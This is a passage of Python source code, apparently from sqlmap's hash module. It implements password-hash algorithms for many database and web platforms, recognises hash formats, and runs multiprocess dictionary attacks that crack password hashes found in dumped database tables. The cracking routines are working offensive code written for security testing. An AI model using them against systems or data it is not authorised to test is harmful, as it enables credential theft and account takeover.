uppercase=False):  # versions '2005' and '2008'\n    \"\"\"\n    Reference(s):\n        http://www.leidecker.info/projects/phrasendrescher/mssql.c\n        https://www.evilfingers.com/tools/GSAuditor.php\n\n    >>> mssql_passwd(password='testpass', salt='4086ceb6', uppercase=False)\n    '0x01004086ceb60c90646a8ab9889fe3ed8e5c150b5460ece8425a'\n    \"\"\"\n\n    binsalt = decodeHex(salt)\n    unistr = b\"\".join((_.encode(UNICODE_ENCODING) + b\"\\0\") if ord(_) < 256 else _.encode(UNICODE_ENCODING) for _ in password)\n\n    retVal = \"0100%s%s\" % (salt, sha1(unistr + binsalt).hexdigest())\n\n    return \"0x%s\" % (retVal.upper() if uppercase else retVal.lower())\n\ndef mssql_old_passwd(password, salt, uppercase=True):  # version '2000' and before\n    \"\"\"\n    Reference(s):\n        www.exploit-db.com/download_pdf/15537/\n        http://www.leidecker.info/projects/phrasendrescher/mssql.c\n        https://www.evilfingers.com/tools/GSAuditor.php\n\n    >>> mssql_old_passwd(password='testpass', salt='4086ceb6', uppercase=True)\n    '0x01004086CEB60C90646A8AB9889FE3ED8E5C150B5460ECE8425AC7BB7255C0C81D79AA5D0E93D4BB077FB9A51DA0'\n    \"\"\"\n\n    binsalt = decodeHex(salt)\n    unistr = b\"\".join((_.encode(UNICODE_ENCODING) + b\"\\0\") if ord(_) < 256 else _.encode(UNICODE_ENCODING) for _ in password)\n\n    retVal = \"0100%s%s%s\" % (salt, sha1(unistr + binsalt).hexdigest(), sha1(unistr.upper() + binsalt).hexdigest())\n\n    return \"0x%s\" % (retVal.upper() if uppercase else retVal.lower())\n\ndef oracle_passwd(password, salt, uppercase=True):\n    \"\"\"\n    Reference(s):\n        https://www.evilfingers.com/tools/GSAuditor.php\n        http://www.notesbit.com/index.php/scripts-oracle/oracle-11g-new-password-algorithm-is-revealed-by-seclistsorg/\n        http://seclists.org/bugtraq/2007/Sep/304\n\n    >>> oracle_passwd(password='SHAlala', salt='1B7B5F82B7235E9E182C', uppercase=True)\n    'S:2BFCFDF5895014EE9BB2B9BA067B01E0389BB5711B7B5F82B7235E9E182C'\n    \"\"\"\n\n    binsalt = decodeHex(salt)\n    password = getBytes(password)\n\n    retVal = \"s:%s%s\" % (sha1(password + binsalt).hexdigest(), salt)\n\n    return retVal.upper() if uppercase else retVal.lower()\n\ndef oracle_old_passwd(password, username, uppercase=True):  # prior to version '11g'\n    \"\"\"\n    Reference(s):\n        http://www.notesbit.com/index.php/scripts-oracle/oracle-11g-new-password-algorithm-is-revealed-by-seclistsorg/\n\n    >>> oracle_old_passwd(password='tiger', username='scott', uppercase=True)\n    'F894844C34402B67'\n    \"\"\"\n\n    IV, pad = b\"\\0\" * 8, b\"\\0\"\n\n    unistr = b\"\".join((b\"\\0\" + _.encode(UNICODE_ENCODING)) if ord(_) < 256 else _.encode(UNICODE_ENCODING) for _ in (username + password).upper())\n\n    if des.__module__ == \"Crypto.Cipher.DES\":\n        unistr += b\"\\0\" * ((8 - len(unistr) % 8) & 7)\n        cipher = des(decodeHex(\"0123456789ABCDEF\"), CBC, iv=IV)\n        encrypted = cipher.encrypt(unistr)\n        cipher = des(encrypted[-8:], CBC, iv=IV)\n        encrypted = cipher.encrypt(unistr)\n    else:\n        cipher = des(decodeHex(\"0123456789ABCDEF\"), CBC, IV, pad)\n        encrypted = cipher.encrypt(unistr)\n        cipher = des(encrypted[-8:], CBC, IV, pad)\n        encrypted = cipher.encrypt(unistr)\n\n    retVal = encodeHex(encrypted[-8:], binary=False)\n\n    return retVal.upper() if uppercase else retVal.lower()\n\ndef md5_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> md5_generic_passwd(password='testpass', uppercase=False)\n    '179ad45c6ce2cb97cf1029e212046e81'\n    \"\"\"\n\n    password = getBytes(password)\n\n    retVal = md5(password).hexdigest()\n\n    return retVal.upper() if uppercase else retVal.lower()\n\ndef sha1_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> sha1_generic_passwd(password='testpass', uppercase=False)\n    '206c80413b9a96c1312cc346b7d2517b84463edd'\n    \"\"\"\n\n    password = getBytes(password)\n\n    retVal = sha1(password).hexdigest()\n\n    return retVal.upper() if uppercase else retVal.lower()\n\ndef apache_sha1_passwd(password, **kwargs):\n    \"\"\"\n    >>> apache_sha1_passwd(password='testpass')\n    '{SHA}IGyAQTualsExLMNGt9JRe4RGPt0='\n    \"\"\"\n\n    password = getBytes(password)\n\n    return \"{SHA}%s\" % getText(base64.b64encode(sha1(password).digest()))\n\ndef ssha_passwd(password, salt, **kwargs):\n    \"\"\"\n    >>> ssha_passwd(password='testpass', salt='salt')\n    '{SSHA}mU1HPTvnmoXOhE4ROHP6sWfbfoRzYWx0'\n    \"\"\"\n\n    password = getBytes(password)\n    salt = getBytes(salt)\n\n    return \"{SSHA}%s\" % getText(base64.b64encode(sha1(password + salt).digest() + salt))\n\ndef ssha256_passwd(password, salt, **kwargs):\n    \"\"\"\n    >>> ssha256_passwd(password='testpass', salt='salt')\n    '{SSHA256}hhubsLrO/Aje9F/kJrgv5ZLE40UmTrVWvI7Dt6InP99zYWx0'\n    \"\"\"\n\n    password = getBytes(password)\n    salt = getBytes(salt)\n\n    return \"{SSHA256}%s\" % getText(base64.b64encode(sha256(password + salt).digest() + salt))\n\ndef ssha512_passwd(password, salt, **kwargs):\n    \"\"\"\n    >>> ssha512_passwd(password='testpass', salt='salt')\n    '{SSHA512}mCUSLfPMhXCQOJl9WHW/QMn9v9sjq7Ht/Wk7iVau8vLOfh+PeynkGMikqIE8sStFd0khdfcCD8xZmC6UyjTxsHNhbHQ='\n    \"\"\"\n\n    password = getBytes(password)\n    salt = getBytes(salt)\n\n    return \"{SSHA512}%s\" % getText(base64.b64encode(sha512(password + salt).digest() + salt))\n\ndef sha224_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> sha224_generic_passwd(password='testpass', uppercase=False)\n    '648db6019764b598f75ab6b7616d2e82563a00eb1531680e19ac4c6f'\n    \"\"\"\n\n    retVal = sha224(getBytes(password)).hexdigest()\n\n    return retVal.upper() if uppercase else retVal.lower()\n\ndef sha256_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> sha256_generic_passwd(password='testpass', uppercase=False)\n    '13d249f2cb4127b40cfa757866850278793f814ded3c587fe5889e889a7a9f6c'\n    \"\"\"\n\n    retVal = sha256(getBytes(password)).hexdigest()\n\n    return retVal.upper() if uppercase else retVal.lower()\n\ndef sha384_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> sha384_generic_passwd(password='testpass', uppercase=False)\n    '6823546e56adf46849343be991d4b1be9b432e42ed1b4bb90635a0e4b930e49b9ca007bc3e04bf0a4e0df6f1f82769bf'\n    \"\"\"\n\n    retVal = sha384(getBytes(password)).hexdigest()\n\n    return retVal.upper() if uppercase else retVal.lower()\n\ndef sha512_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> sha512_generic_passwd(password='testpass', uppercase=False)\n    '78ddc8555bb1677ff5af75ba5fc02cb30bb592b0610277ae15055e189b77fe3fda496e5027a3d99ec85d54941adee1cc174b50438fdc21d82d0a79f85b58cf44'\n    \"\"\"\n\n    retVal = sha512(getBytes(password)).hexdigest()\n\n    return retVal.upper() if uppercase else retVal.lower()\n\ndef crypt_generic_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference(s):\n        http://docs.python.org/library/crypt.html\n        http://helpful.knobs-dials.com/index.php/Hashing_notes\n        http://php.net/manual/en/function.crypt.php\n        http://carey.geek.nz/code/python-fcrypt/\n\n    >>> crypt_generic_passwd(password='rasmuslerdorf', salt='rl', uppercase=False)\n    'rl.3StKT.4T8M'\n    \"\"\"\n\n    return getText(crypt(password, salt))\n\ndef unix_md5_passwd(password, salt, magic=\"$1$\", **kwargs):\n    \"\"\"\n    Reference(s):\n        http://www.sabren.net/code/python/crypt/md5crypt.py\n\n    >>> unix_md5_passwd(password='testpass', salt='aD9ZLmkp')\n    '$1$aD9ZLmkp$DRM5a7rRZGyuuOPOjTEk61'\n    \"\"\"\n\n    def _encode64(value, count):\n        output = \"\"\n\n        while (count - 1 >= 0):\n            count = count - 1\n            output += ITOA64[value & 0x3f]\n            value = value >> 6\n\n        return output\n\n    password = getBytes(password)\n    magic = getBytes(magic)\n    salt = getBytes(salt)\n\n    salt = salt[:8]\n    ctx = password + magic + salt\n    final = md5(password + salt + password).digest()\n\n    for pl in xrange(len(password), 0, -16):\n        if pl > 16:\n            ctx = ctx + final[:16]\n        else:\n            ctx = ctx + final[:pl]\n\n    i = len(password)\n    while i:\n        if i & 1:\n            ctx = ctx + b'\\x00'  # if ($i & 1) { $ctx->add(pack(\"C\", 0)); }\n        else:\n            ctx = ctx + password[0:1]\n        i = i >> 1\n\n    final = md5(ctx).digest()\n\n    for i in xrange(1000):\n        ctx1 = b\"\"\n\n        if i & 1:\n            ctx1 = ctx1 + password\n        else:\n            ctx1 = ctx1 + final[:16]\n\n        if i % 3:\n            ctx1 = ctx1 + salt\n\n        if i % 7:\n            ctx1 = ctx1 + password\n\n        if i & 1:\n            ctx1 = ctx1 + final[:16]\n        else:\n            ctx1 = ctx1 + password\n\n        final = md5(ctx1).digest()\n\n    hash_ = _encode64((int(ord(final[0:1])) << 16) | (int(ord(final[6:7])) << 8) | (int(ord(final[12:13]))), 4)\n    hash_ = hash_ + _encode64((int(ord(final[1:2])) << 16) | (int(ord(final[7:8])) << 8) | (int(ord(final[13:14]))), 4)\n    hash_ = hash_ + _encode64((int(ord(final[2:3])) << 16) | (int(ord(final[8:9])) << 8) | (int(ord(final[14:15]))), 4)\n    hash_ = hash_ + _encode64((int(ord(final[3:4])) << 16) | (int(ord(final[9:10])) << 8) | (int(ord(final[15:16]))), 4)\n    hash_ = hash_ + _encode64((int(ord(final[4:5])) << 16) | (int(ord(final[10:11])) << 8) | (int(ord(final[5:6]))), 4)\n    hash_ = hash_ + _encode64((int(ord(final[11:12]))), 2)\n\n    return getText(magic + salt + b'$' + getBytes(hash_))\n\ndef joomla_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference: https://stackoverflow.com/a/10428239\n\n    >>> joomla_passwd(password='testpass', salt='6GGlnaquVXI80b3HRmSyE3K1wEFFaBIf')\n    'e3d5794da74e917637332e0d21b76328:6GGlnaquVXI80b3HRmSyE3K1wEFFaBIf'\n    \"\"\"\n\n    return \"%s:%s\" % (md5(getBytes(password) + getBytes(salt)).hexdigest(), salt)\n\ndef django_md5_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference: https://github.com/jay0lee/GAM/blob/master/src/passlib/handlers/django.py\n\n    >>> django_md5_passwd(password='testpass', salt='salt')\n    'md5$salt$972141bcbcb6a0acc96e92309175b3c5'\n    \"\"\"\n\n    return \"md5$%s$%s\" % (salt, md5(getBytes(salt) + getBytes(password)).hexdigest())\n\ndef django_sha1_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference: https://github.com/jay0lee/GAM/blob/master/src/passlib/handlers/django.py\n\n    >>> django_sha1_passwd(password='testpass', salt='salt')\n    'sha1$salt$6ce0e522aba69d8baa873f01420fccd0250fc5b2'\n    \"\"\"\n\n    return \"sha1$%s$%s\" % (salt, sha1(getBytes(salt) + getBytes(password)).hexdigest())\n\ndef vbulletin_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference: https://stackoverflow.com/a/2202810\n\n    >>> vbulletin_passwd(password='testpass', salt='salt')\n    '85c4d8ea77ebef2236fb7e9d24ba9482:salt'\n    \"\"\"\n\n    return \"%s:%s\" % (md5(binascii.hexlify(md5(getBytes(password)).digest()) + getBytes(salt)).hexdigest(), salt)\n\ndef phpass_passwd(password, salt, count, prefix, **kwargs):\n    \"\"\"\n    Reference(s):\n        https://web.archive.org/web/20120219120128/packetstormsecurity.org/files/74448/phpassbrute.py.txt\n        http://scriptserver.mainframe8.com/wordpress_password_hasher.php\n        https://www.openwall.com/phpass/\n        https://github.com/jedie/django-phpBB3/blob/master/django_phpBB3/hashers.py\n\n    >>> phpass_passwd(password='testpass', salt='aD9ZLmkp', count=2048, prefix='$P$')\n    '$P$9aD9ZLmkpsN4A83G8MefaaP888gVKX0'\n    >>> phpass_passwd(password='testpass', salt='Pb1j9gSb', count=2048, prefix='$H$')\n    '$H$9Pb1j9gSb/u3EVQ.4JDZ3LqtN44oIx/'\n    >>> phpass_passwd(password='testpass', salt='iwtD/g.K', count=128, prefix='$S$')\n    '$S$5iwtD/g.KZT2rwC9DASy/mGYAThkSd3lBFdkONi1Ig1IEpBpqG8W'\n    \"\"\"\n\n    def _encode64(input_, count):\n        output = ''\n        i = 0\n\n        while i < count:\n            value = (input_[i] if isinstance(input_[i], int) else ord(input_[i]))\n            i += 1\n            output = output + ITOA64[value & 0x3f]\n\n            if i < count:\n                value = value | ((input_[i] if isinstance(input_[i], int) else ord(input_[i])) << 8)\n\n            output = output + ITOA64[(value >> 6) & 0x3f]\n\n            i += 1\n            if i >= count:\n                break\n\n            if i < count:\n                value = value | ((input_[i] if isinstance(input_[i], int) else ord(input_[i])) << 16)\n\n            output = output + ITOA64[(value >> 12) & 0x3f]\n\n            i += 1\n            if i >= count:\n                break\n\n            output = output + ITOA64[(value >> 18) & 0x3f]\n\n        return output\n\n    password = getBytes(password)\n    f = {\"$P$\": md5, \"$H$\": md5, \"$Q$\": sha1, \"$S$\": sha512}[prefix]\n\n    cipher = f(getBytes(salt))\n    cipher.update(password)\n    hash_ = cipher.digest()\n\n    for i in xrange(count):\n        _ = f(hash_)\n        _.update(password)\n        hash_ = _.digest()\n\n    retVal = \"%s%s%s%s\" % (prefix, ITOA64[int(math.log(count, 2))], salt, _encode64(hash_, len(hash_)))\n\n    if prefix == \"$S$\":\n        # Reference: https://api.drupal.org/api/drupal/includes%21password.inc/constant/DRUPAL_HASH_LENGTH/7.x\n        retVal = retVal[:55]\n\n    return retVal\n\n__functions__ = {\n    HASH.MYSQL: mysql_passwd,\n    HASH.MYSQL_OLD: mysql_old_passwd,\n    HASH.POSTGRES: postgres_passwd,\n    HASH.MSSQL: mssql_passwd,\n    HASH.MSSQL_OLD: mssql_old_passwd,\n    HASH.MSSQL_NEW: mssql_new_passwd,\n    HASH.ORACLE: oracle_passwd,\n    HASH.ORACLE_OLD: oracle_old_passwd,\n    HASH.MD5_GENERIC: md5_generic_passwd,\n    HASH.SHA1_GENERIC: sha1_generic_passwd,\n    HASH.SHA224_GENERIC: sha224_generic_passwd,\n    HASH.SHA256_GENERIC: sha256_generic_passwd,\n    HASH.SHA384_GENERIC: sha384_generic_passwd,\n    HASH.SHA512_GENERIC: sha512_generic_passwd,\n    HASH.CRYPT_GENERIC: crypt_generic_passwd,\n    HASH.JOOMLA: joomla_passwd,\n    HASH.DJANGO_MD5: django_md5_passwd,\n    HASH.DJANGO_SHA1: django_sha1_passwd,\n    HASH.PHPASS: phpass_passwd,\n    HASH.APACHE_MD5_CRYPT: unix_md5_passwd,\n    HASH.UNIX_MD5_CRYPT: unix_md5_passwd,\n    HASH.APACHE_SHA1: apache_sha1_passwd,\n    HASH.VBULLETIN: vbulletin_passwd,\n    HASH.VBULLETIN_OLD: vbulletin_passwd,\n    HASH.SSHA: ssha_passwd,\n    HASH.SSHA256: ssha256_passwd,\n    HASH.SSHA512: ssha512_passwd,\n    HASH.MD5_BASE64: md5_generic_passwd,\n    HASH.SHA1_BASE64: sha1_generic_passwd,\n    HASH.SHA256_BASE64: sha256_generic_passwd,\n    HASH.SHA512_BASE64: sha512_generic_passwd,\n}\n\ndef _finalize(retVal, results, processes, attack_info=None):\n    if _multiprocessing:\n        gc.enable()\n\n    # NOTE: https://github.com/sqlmapproject/sqlmap/issues/4367\n    # NOTE: https://dzone.com/articles/python-101-creating-multiple-processes\n    for process in processes:\n        try:\n            process.terminate()\n            process.join()\n        except (OSError, AttributeError):\n            pass\n\n    if retVal:\n        removals = set()\n\n        if conf.hashDB:\n            conf.hashDB.beginTransaction()\n\n        while not retVal.empty():\n            user, hash_, word = item = retVal.get(block=False)\n            results.append(item)\n            removals.add((user, hash_))\n            hashDBWrite(hash_, word)\n\n        for item in attack_info or []:\n            if (item[0][0], item[0][1]) in removals:\n                attack_info.remove(item)\n\n        if conf.hashDB:\n            conf.hashDB.endTransaction()\n\n        if hasattr(retVal, \"close\"):\n            retVal.close()\n\ndef storeHashesToFile(attack_dict):\n    if not attack_dict:\n        return\n\n    items = OrderedSet()\n\n    for user, hashes in attack_dict.items():\n        for hash_ in hashes:\n            hash_ = hash_.split()[0] if hash_ and hash_.strip() else hash_\n            if hash_ and hash_ != NULL and hashRecognition(hash_):\n                item = None\n                if user and not user.startswith(DUMMY_USER_PREFIX):\n                    item = \"%s:%s\\n\" % (user, hash_)\n                else:\n                    item = \"%s\\n\" % hash_\n\n                if item and item not in items:\n                    items.add(item)\n\n    if kb.choices.storeHashes is None:\n        message = \"do you want to store hashes to a temporary file \"\n        message += \"for eventual further processing with other tools [y/N] \"\n\n        kb.choices.storeHashes = readInput(message, default='N', boolean=True)\n\n    if items and kb.choices.storeHashes:\n        handle, filename = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.HASHES, suffix=\".txt\")\n        os.close(handle)\n\n        infoMsg = \"writing hashes to a temporary file '%s' \" % filename\n        logger.info(infoMsg)\n\n        with openFile(filename, \"w+\") as f:\n            for item in items:\n                try:\n                    f.write(item)\n                except (UnicodeError, TypeError):\n                    pass\n\ndef attackCachedUsersPasswords():\n    if kb.data.cachedUsersPasswords:\n        results = dictionaryAttack(kb.data.cachedUsersPasswords)\n\n        lut = {}\n        for (_, hash_, password) in results:\n            lut[hash_.lower()] = password\n\n        for user in kb.data.cachedUsersPasswords:\n            for i in xrange(len(kb.data.cachedUsersPasswords[user])):\n                if (kb.data.cachedUsersPasswords[user][i] or \"\").strip():\n                    value = kb.data.cachedUsersPasswords[user][i].lower().split()[0]\n                    if value in lut:\n                        kb.data.cachedUsersPasswords[user][i] += \"%s    clear-text password: %s\" % ('\\n' if kb.data.cachedUsersPasswords[user][i][-1] != '\\n' else '', lut[value])\n\ndef attackDumpedTable():\n    if kb.data.dumpedTable:\n        table = kb.data.dumpedTable\n        columns = list(table.keys())\n        count = table[\"__infos__\"][\"count\"]\n\n        if not count:\n            return\n\n        debugMsg = \"analyzing table dump for possible password hashes\"\n        logger.debug(debugMsg)\n\n        found = False\n        col_user = ''\n        col_passwords = set()\n        attack_dict = {}\n        binary_fields = OrderedSet()\n        replacements = {}\n\n        for column in sorted(columns, key=len, reverse=True):\n            if column and column.lower() in COMMON_USER_COLUMNS:\n                col_user = column\n                break\n\n        for column in columns:\n            if column != \"__infos__\" and table[column][\"values\"]:\n                if all(INVALID_UNICODE_CHAR_FORMAT.split('%')[0] in (value or \"\") for value in table[column][\"values\"]):\n                    binary_fields.add(column)\n\n        if binary_fields:\n            _ = ','.join(binary_fields)\n            warnMsg = \"potential binary fields detected ('%s'). In case of any problems you are \" % _\n            warnMsg += \"advised to rerun table dump with '--fresh-queries --binary-fields=\\\"%s\\\"'\" % _\n            logger.warning(warnMsg)\n\n        for i in xrange(count):\n            if not found and i > HASH_RECOGNITION_QUIT_THRESHOLD:\n                break\n\n            for column in columns:\n                if column == col_user or column == \"__infos__\":\n                    continue\n\n                if len(table[column][\"values\"]) <= i:\n                    continue\n\n                if conf.binaryFields and column in conf.binaryFields:\n                    continue\n\n                value = table[column][\"values\"][i]\n\n                if column in binary_fields and re.search(HASH_BINARY_COLUMNS_REGEX, column) is not None:\n                    previous = value\n                    value = encodeHex(getBytes(value), binary=False)\n                    replacements[value] = previous\n\n                if hashRecognition(value):\n                    found = True\n\n                    if col_user and i < len(table[col_user][\"values\"]):\n                        if table[col_user][\"values\"][i] not in attack_dict:\n                            attack_dict[table[col_user][\"values\"][i]] = []\n\n                        attack_dict[table[col_user][\"values\"][i]].append(value)\n                    else:\n                        attack_dict[\"%s%d\" % (DUMMY_USER_PREFIX, i)] = [value]\n\n                    col_passwords.add(column)\n\n        if attack_dict:\n            infoMsg = \"recognized possible password hashes in column%s \" % (\"s\" if len(col_passwords) > 1 else \"\")\n            infoMsg += \"'%s'\" % \", \".join(col for col in col_passwords)\n            logger.info(infoMsg)\n\n            storeHashesToFile(attack_dict)\n\n            message = \"do you want to crack them via a dictionary-based attack? %s\" % (\"[y/N/q]\" if conf.multipleTargets else \"[Y/n/q]\")\n            choice = readInput(message, default='N' if conf.multipleTargets else 'Y').upper()\n\n            if choice == 'N':\n                return\n            elif choice == 'Q':\n                raise SqlmapUserQuitException\n\n            results = dictionaryAttack(attack_dict)\n            lut = dict()\n\n            for (_, hash_, password) in results:\n                if hash_:\n                    key = hash_ if hash_ not in replacements else replacements[hash_]\n                    lut[key.lower()] = password\n                    lut[\"0x%s\" % key.lower()] = password\n\n            debugMsg = \"post-processing table dump\"\n            logger.debug(debugMsg)\n\n            for i in xrange(count):\n                for column in columns:\n                    if not (column == col_user or column == '__infos__' or len(table[column]['values']) <= i):\n                        value = table[column]['values'][i]\n\n                        if value and value.lower() in lut:\n                            table[column]['values'][i] = \"%s (%s)\" % (getUnicode(table[column]['values'][i]), getUnicode(lut[value.lower()] or HASH_EMPTY_PASSWORD_MARKER))\n                            table[column]['length'] = max(table[column]['length'], len(table[column]['values'][i]))\n\ndef hashRecognition(value):\n    \"\"\"\n    >>> hashRecognition(\"179ad45c6ce2cb97cf1029e212046e81\") == HASH.MD5_GENERIC\n    True\n    >>> hashRecognition(\"S:2BFCFDF5895014EE9BB2B9BA067B01E0389BB5711B7B5F82B7235E9E182C\") == HASH.ORACLE\n    True\n    >>> hashRecognition(\"foobar\") == None\n    True\n    \"\"\"\n\n    retVal = None\n\n    if value and len(value) >= 8 and ' ' not in value:   # Note: pre-filter condition (for optimization purposes)\n        isOracle, isMySQL = Backend.isDbms(DBMS.ORACLE), Backend.isDbms(DBMS.MYSQL)\n\n        if kb.cache.hashRegex is None:\n            parts = []\n\n            for name, regex in getPublicTypeMembers(HASH):\n                # Hashes for Oracle and old MySQL look the same hence these checks\n                if isOracle and regex == HASH.MYSQL_OLD or isMySQL and regex == HASH.ORACLE_OLD:\n                    continue\n                elif regex == HASH.CRYPT_GENERIC:\n                    if any((value.lower() == value, value.upper() == value)):\n                        continue\n                else:\n                    parts.append(\"(?P<%s>%s)\" % (name, regex))\n\n            kb.cache.hashRegex = ('|'.join(parts)).replace(\"(?i)\", \"\")\n\n        if isinstance(value, six.string_types):\n            match = re.search(kb.cache.hashRegex, value, re.I)\n            if match:\n                algorithm, _ = [_ for _ in match.groupdict().items() if _[1] is not None][0]\n                retVal = getattr(HASH, algorithm)\n\n    return retVal\n\ndef _bruteProcessVariantA(attack_info, hash_regex, suffix, retVal, proc_id, proc_count, wordlists, custom_wordlist, api):\n    if IS_WIN:\n        coloramainit()\n\n    count = 0\n    rotator = 0\n    hashes = set(item[0][1] for item in attack_info)\n\n    wordlist = Wordlist(wordlists, proc_id, getattr(proc_count, \"value\", 0), custom_wordlist)\n\n    try:\n        for word in wordlist:\n            if not attack_info:\n                break\n\n            count += 1\n\n            if isinstance(word, six.binary_type):\n                word = getUnicode(word)\n            elif not isinstance(word, six.string_types):\n                continue\n\n            if suffix:\n                word = word + suffix\n\n            try:\n                current = __functions__[hash_regex](password=word, uppercase=False)\n\n                if current in hashes:\n                    for item in attack_info[:]:\n                        ((user, hash_), _) = item\n\n                        if hash_ == current:\n                            retVal.put((user, hash_, word))\n\n                            clearConsoleLine()\n\n                            infoMsg = \"\\r[%s] [INFO] cracked password '%s'\" % (time.strftime(\"%X\"), word)\n\n                            if user and not user.startswith(DUMMY_USER_PREFIX):\n                                infoMsg += \" for user '%s'\\n\" % user\n                            else:\n                                infoMsg += \" for hash '%s'\\n\" % hash_\n\n                            dataToStdout(infoMsg, True)\n\n                            attack_info.remove(item)\n\n                elif (proc_id == 0 or getattr(proc_count, \"value\", 0) == 1) and count % HASH_MOD_ITEM_DISPLAY == 0 or hash_regex == HASH.ORACLE_OLD or hash_regex == HASH.CRYPT_GENERIC and IS_WIN:\n                    rotator += 1\n\n                    if rotator >= len(ROTATING_CHARS):\n                        rotator = 0\n\n                    status = \"current status: %s... %s\" % (word.ljust(5)[:5], ROTATING_CHARS[rotator])\n\n                    if not api:\n                        dataToStdout(\"\\r[%s] [INFO] %s\" % (time.strftime(\"%X\"), status))\n\n            except KeyboardInterrupt:\n                raise\n\n            except (UnicodeEncodeError, UnicodeDecodeError):\n                pass  # ignore possible encoding problems caused by some words in custom dictionaries\n\n            except Exception as ex:\n                warnMsg = \"there was a problem while hashing entry: %s ('%s'). \" % (repr(word), getSafeExString(ex))\n                warnMsg += \"Please report by e-mail to '%s'\" % DEV_EMAIL_ADDRESS\n                logger.critical(warnMsg)\n\n    except KeyboardInterrupt:\n        pass\n\n    finally:\n        if hasattr(proc_count, \"value\"):\n            with proc_count.get_lock():\n                proc_count.value -= 1\n\ndef _bruteProcessVariantB(user, hash_, kwargs, hash_regex, suffix, retVal, found, proc_id, proc_count, wordlists, custom_wordlist, api):\n    if IS_WIN:\n        coloramainit()\n\n    count = 0\n    rotator = 0\n\n    wordlist = Wordlist(wordlists, proc_id, getattr(proc_count, \"value\", 0), custom_wordlist)\n\n    try:\n        for word in wordlist:\n            if found.value:\n                break\n\n            count += 1\n\n            if isinstance(word, six.binary_type):\n                word = getUnicode(word)\n            elif not isinstance(word, six.string_types):\n                continue\n\n            if suffix:\n                word = word + suffix\n\n            try:\n                current = __functions__[hash_regex](password=word, uppercase=False, **kwargs)\n\n                if hash_ == current:\n                    if hash_regex == HASH.ORACLE_OLD:  # only for cosmetic purposes\n                        word = word.upper()\n\n                    retVal.put((user, hash_, word))\n\n                    clearConsoleLine()\n\n                    infoMsg = \"\\r[%s] [INFO] cracked password '%s'\" % (time.strftime(\"%X\"), word)\n\n                    if user and not user.startswith(DUMMY_USER_PREFIX):\n                        infoMsg += \" for user '%s'\\n\" % user\n                    else:\n                        infoMsg += \" for hash '%s'\\n\" % hash_\n\n                    dataToStdout(infoMsg, True)\n\n                    found.value = True\n\n                elif (proc_id == 0 or getattr(proc_count, \"value\", 0) == 1) and count % HASH_MOD_ITEM_DISPLAY == 0:\n                    rotator += 1\n\n                    if rotator >= len(ROTATING_CHARS):\n                        rotator = 0\n\n                    status = \"current status: %s... %s\" % (word.ljust(5)[:5], ROTATING_CHARS[rotator])\n\n                    if user and not user.startswith(DUMMY_USER_PREFIX):\n                        status += \" (user: %s)\" % user\n\n                    if not api:\n                        dataToStdout(\"\\r[%s] [INFO] %s\" % (time.strftime(\"%X\"), status))\n\n            except KeyboardInterrupt:\n                raise\n\n            except (UnicodeEncodeError, UnicodeDecodeError):\n                pass  # ignore possible encoding problems caused by some words in custom dictionaries\n\n            except Exception as ex:\n                warnMsg = \"there was a problem while hashing entry: %s ('%s'). \" % (repr(word), getSafeExString(ex))\n                warnMsg += \"Please report by e-mail to '%s'\" % DEV_EMAIL_ADDRESS\n                logger.critical(warnMsg)\n\n    except KeyboardInterrupt:\n        pass\n\n    finally:\n        if hasattr(proc_count, \"value\"):\n            with proc_count.get_lock():\n                proc_count.value -= 1\n\ndef dictionaryAttack(attack_dict):\n    global _multiprocessing\n\n    suffix_list = [\"\"]\n    custom_wordlist = [\"\"]\n    hash_regexes = []\n    results = []\n    resumes = []\n    user_hash = []\n    processException = False\n    foundHash = False\n\n    if conf.disableMulti:\n        _multiprocessing = None\n    else:\n        # Note: https://github.com/sqlmapproject/sqlmap/issues/4367\n        try:\n            import multiprocessing\n\n            # problems on FreeBSD (Reference: https://web.archive.org/web/20110710041353/http://www.eggheadcafe.com/microsoft/Python/35880259/multiprocessing-on-freebsd.aspx)\n            _ = multiprocessing.Queue()\n\n            # problems with ctypes (Reference: https://github.com/sqlmapproject/sqlmap/issues/2952)\n            _ = multiprocessing.Value('i')\n        except (ImportError, OSError, AttributeError):\n            pass\n        else:\n            try:\n                if multiprocessing.cpu_count() > 1:\n                    _multiprocessing = multiprocessing\n            except NotImplementedError:\n                pass\n\n    for (_, hashes) in attack_dict.items():\n        for hash_ in hashes:\n            if not hash_:\n                continue\n\n            hash_ = hash_.split()[0] if hash_ and hash_.strip() else hash_\n            regex = hashRecognition(hash_)\n\n            if regex and regex not in hash_regexes:\n                hash_regexes.append(regex)\n                infoMsg = \"using hash method '%s'\" % __functions__[regex].__name__\n                logger.info(infoMsg)\n\n    for hash_regex in hash_regexes:\n        keys = set()\n        attack_info = []\n\n        for (user, hashes) in attack_dict.items():\n            for hash_ in hashes:\n                if not hash_:\n                    continue\n\n                foundHash = True\n                hash_ = hash_.split()[0] if hash_ and hash_.strip() else hash_\n\n                if re.match(hash_regex, hash_):\n                    try:\n                        item = None\n\n                        if hash_regex not in (HASH.CRYPT_GENERIC, HASH.JOOMLA, HASH.PHPASS, HASH.UNIX_MD5_CRYPT, HASH.APACHE_MD5_CRYPT, HASH.APACHE_SHA1, HASH.VBULLETIN, HASH.VBULLETIN_OLD, HASH.SSHA, HASH.SSHA256, HASH.SSHA512, HASH.DJANGO_MD5, HASH.DJANGO_SHA1, HASH.MD5_BASE64, HASH.SHA1_BASE64, HASH.SHA256_BASE64, HASH.SHA512_BASE64):\n                            hash_ = hash_.lower()\n\n                        if hash_regex in (HASH.MD5_BASE64, HASH.SHA1_BASE64, HASH.SHA256_BASE64, HASH.SHA512_BASE64):\n                            item = [(user, encodeHex(decodeBase64(hash_, binary=True))), {}]\n                        elif hash_regex in (HASH.MYSQL, HASH.MYSQL_OLD, HASH.MD5_GENERIC, HASH.SHA1_GENERIC, HASH.SHA224_GENERIC, HASH.SHA256_GENERIC, HASH.SHA384_GENERIC, HASH.SHA512_GENERIC, HASH.APACHE_SHA1):\n                            if hash_.startswith(\"0x\"):  # Reference: 